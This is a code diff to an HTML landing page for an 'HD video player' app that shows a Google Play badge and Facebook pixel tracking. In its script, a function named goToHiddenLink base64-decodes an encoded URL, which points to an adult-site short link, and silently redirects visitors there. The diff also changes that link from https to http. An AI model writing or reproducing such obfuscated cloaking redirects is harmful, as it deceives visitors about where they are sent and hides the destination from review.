@@ -81,7 +81,6 @@
       font-size: 14px;
       color: #333;
     }
-
     .cta-btn {
       display: inline-block;
       background-color: #00bcd4;
@@ -132,7 +131,7 @@
     <div class="cta-actions">
       <div class="store-guides">
         <img src="https://sarasmith199536.github.io/ttgg-landing/assets/google-play-badge.png" alt="Google Play" id="google-play-btn"
-             onclick="window.open('https://play.google.com/store/apps/details?id=com.hdvideo.player.offline','_blank')" />
+             onclick="fbq('trackCustom', 'GooglePlayClick'); window.open('https://play.google.com/store/apps/details?id=com.hdvideo.player.offline','_blank')" />
 
         <img src="https://sarasmith199536.github.io/ttgg-landing/assets/arrow-guide.png" alt="Guide Arrow" style="width:80px">
 
@@ -152,17 +151,12 @@
 
   <script>
     function goToHiddenLink() {
-      const encoded = "aHR0cHM6Ly9wb3JuZHVkZS5vbmxpbmUvbWVRUg=="; // 更新后的短链
+      const encoded = "aHR0cDovL3Bvcm5kdWRlLm9ubGluZS9tZVFS";
       const link = atob(encoded);
       fbq('trackCustom', 'EntryClick');
       window.location.href = link;
     }
 
-    document.getElementById('google-play-btn')?.addEventListener('click', function () {
-      fbq('trackCustom', 'GooglePlayClick');
-    });
-
-    // 多语言切换
     const lang = navigator.language || navigator.userLanguage;
     if (lang.startsWith('en')) {
       document.documentElement.lang = 'en';
